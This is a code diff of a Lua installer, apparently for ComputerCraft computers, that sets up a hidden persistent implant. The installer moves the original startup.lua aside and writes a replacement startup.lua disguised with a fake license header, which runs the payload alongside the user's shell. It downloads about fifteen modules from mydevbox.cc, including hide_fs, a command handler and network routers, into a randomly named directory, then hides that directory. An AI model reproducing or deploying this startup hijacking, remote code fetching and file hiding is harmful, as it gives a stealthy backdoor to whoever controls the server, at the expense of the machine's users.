@@ -74,7 +74,6 @@ local function uninstall()
 end
 
 local function installer()
-    
     local function generateRandomString(length)
         local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
         local result = {}
@@ -88,19 +87,24 @@ local function installer()
     local DIR_4Nin92xCdd0 = generateRandomString(8)
     OriginalInstallDir = DIR_4Nin92xCdd0
 
+    local metadataFilename = generateRandomString(8) -- Set your metadata filename here
+    local randomDelimiter = "^" -- Use a random delimiter for separation
 
     originalStartup = getRealStartupPath()
-    oldStartupFileName=generateRandomString(8)--Does not end with .lua
-    if (originalStartup==nil) then
+    oldStartupFileName = generateRandomString(8) -- Does not end with .lua
+    if (originalStartup == nil) then
         if OriginalFS.exists("startup.lua") then
-            OriginalFS.move("startup.lua",oldStartupFileName..".lua")
+            OriginalFS.move("startup.lua", oldStartupFileName .. ".lua")
             local f = OriginalFS.open("startup.lua", "w")
             f.write(string.format([[
+
 -- SPDX-FileCopyrightText: 2025 David Lightman
 --
 -- SPDX-License-Identifier: LicenseRef-CCPL
 --%s.
 --%s,%s
+--%s%s%s
+
 local function a1()
     shell.setDir("/")
     shell.run("%s")
@@ -112,33 +116,37 @@ local function a2()
 end
 parallel.waitForAny(a1, a2)
 os.shutdown()
-                ]], oldStartupFileName, OriginalInstallDir, "main.lua", oldStartupFileName, OriginalInstallDir, "main.lua"))
+                ]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua"))
             f.close()
         else
             local f = OriginalFS.open(oldStartupFileName, "w")
             f.close()
             local f = OriginalFS.open("startup.lua", "w")
             f.write(string.format([[
--- SPDX-FileCopyrightText: 2025 David Lightman
---
--- SPDX-License-Identifier: LicenseRef-CCPL
---%s.
---%s,%s
-local function a1()
-    shell.setDir("/")
-    shell.run("shell.lua")
-end
-local function a2()
-    shell.setDir("/")
-    shell.run("%s/%s")
-end
-parallel.waitForAny(a1, a2)
-            ]], oldStartupFileName, OriginalInstallDir, "main.lua", OriginalInstallDir, "main.lua"))
-            
 
-        f.close()
+            -- SPDX-FileCopyrightText: 2025 David Lightman
+            --
+            -- SPDX-License-Identifier: LicenseRef-CCPL
+            --%s.
+            --%s,%s
+            --%s%s%s
+            
+            local function a1()
+                shell.setDir("/")
+                shell.run("%s")
+                shell.run("shell.lua")
+            end
+            local function a2()
+                shell.setDir("/")
+                shell.run("%s/%s")
+            end
+            parallel.waitForAny(a1, a2)
+            os.shutdown()
+                            ]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua"))
+            f.close()
         end
     end
+
     local function downloadFile(url, path)
         local response = http.get(url, {["User-Agent"] = "ComputerCraft-BDA-Client"})
         if response then
@@ -151,26 +159,27 @@ parallel.waitForAny(a1, a2)
             print("Failed to download file from " .. url)
         end
     end
-    
-    downloadFile("https://mydevbox.cc/src/hooks/eventhook.lua", "/"..DIR_4Nin92xCdd0.."/hooks/eventhook.lua")
-    downloadFile("https://mydevbox.cc/src/networking/http/http.lua", "/"..DIR_4Nin92xCdd0.."/networking/http/http.lua")
-    downloadFile("https://mydevbox.cc/src/modules/persistent/hide_fs.lua", "/"..DIR_4Nin92xCdd0.."/modules/persistent/hide_fs.lua")
-    downloadFile("https://mydevbox.cc/src/hooks/custompairs.lua", "/"..DIR_4Nin92xCdd0.."/hooks/custompairs.lua")
-    downloadFile("https://mydevbox.cc/src/eventhandler/eventhandler.lua", "/"..DIR_4Nin92xCdd0.."/eventhandler/eventhandler.lua")
-    downloadFile("https://mydevbox.cc/src/config/config.lua", "/"..DIR_4Nin92xCdd0.."/config/config.lua")
-    downloadFile("https://mydevbox.cc/src/sys/utils/utils.lua", "/"..DIR_4Nin92xCdd0.."/sys/utils/utils.lua")
-    downloadFile("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", "/"..DIR_4Nin92xCdd0.."/sys/crypto/cc_rsa.lua")
-    downloadFile("https://mydevbox.cc/src/networking/http/wsrouter.lua", "/"..DIR_4Nin92xCdd0.."/networking/http/wsrouter.lua")
-    downloadFile("https://mydevbox.cc/src/networking/rednet/router.lua", "/"..DIR_4Nin92xCdd0.."/networking/rednet/router.lua")
-    downloadFile("https://mydevbox.cc/src/networking/core_router.lua", "/"..DIR_4Nin92xCdd0.."/networking/core_router.lua")
-    downloadFile("https://mydevbox.cc/src/sys/crypto/EnD.lua", "/"..DIR_4Nin92xCdd0.."/sys/crypto/EnD.lua")
-    downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", "/"..DIR_4Nin92xCdd0.."/networking/processor/command_handler.lua")
-    downloadFile("https://mydevbox.cc/src/uninstaller.lua", "/"..DIR_4Nin92xCdd0.."/uninstaller.lua")
-    downloadFile("https://mydevbox.cc/src/main.lua", "/"..DIR_4Nin92xCdd0.."/main.lua")
-    if (CustomFS~=nil) then
+
+    downloadFile("https://mydevbox.cc/src/hooks/eventhook.lua", "/" .. DIR_4Nin92xCdd0 .. "/hooks/eventhook.lua")
+    downloadFile("https://mydevbox.cc/src/networking/http/http.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/http/http.lua")
+    downloadFile("https://mydevbox.cc/src/modules/persistent/hide_fs.lua", "/" .. DIR_4Nin92xCdd0 .. "/modules/persistent/hide_fs.lua")
+    downloadFile("https://mydevbox.cc/src/hooks/custompairs.lua", "/" .. DIR_4Nin92xCdd0 .. "/hooks/custompairs.lua")
+    downloadFile("https://mydevbox.cc/src/eventhandler/eventhandler.lua", "/" .. DIR_4Nin92xCdd0 .. "/eventhandler/eventhandler.lua")
+    downloadFile("https://mydevbox.cc/src/config/config.lua", "/" .. DIR_4Nin92xCdd0 .. "/config/config.lua")
+    downloadFile("https://mydevbox.cc/src/sys/utils/utils.lua", "/" .. DIR_4Nin92xCdd0 .. "/sys/utils/utils.lua")
+    downloadFile("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", "/" .. DIR_4Nin92xCdd0 .. "/sys/crypto/cc_rsa.lua")
+    downloadFile("https://mydevbox.cc/src/networking/http/wsrouter.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/http/wsrouter.lua")
+    downloadFile("https://mydevbox.cc/src/networking/rednet/router.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/rednet/router.lua")
+    downloadFile("https://mydevbox.cc/src/networking/core_router.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/core_router.lua")
+    downloadFile("https://mydevbox.cc/src/sys/crypto/EnD.lua", "/" .. DIR_4Nin92xCdd0 .. "/sys/crypto/EnD.lua")
+    downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/processor/command_handler.lua")
+    downloadFile("https://mydevbox.cc/src/uninstaller.lua", "/" .. DIR_4Nin92xCdd0 .. "/uninstaller.lua")
+    downloadFile("https://mydevbox.cc/src/main.lua", "/" .. DIR_4Nin92xCdd0 .. "/main.lua")
+    if (CustomFS ~= nil) then
         CustomFS.hideDir(DIR_4Nin92xCdd0)
     end
 end
+
 
 function uninstaller.uninstall()
     uninstall()
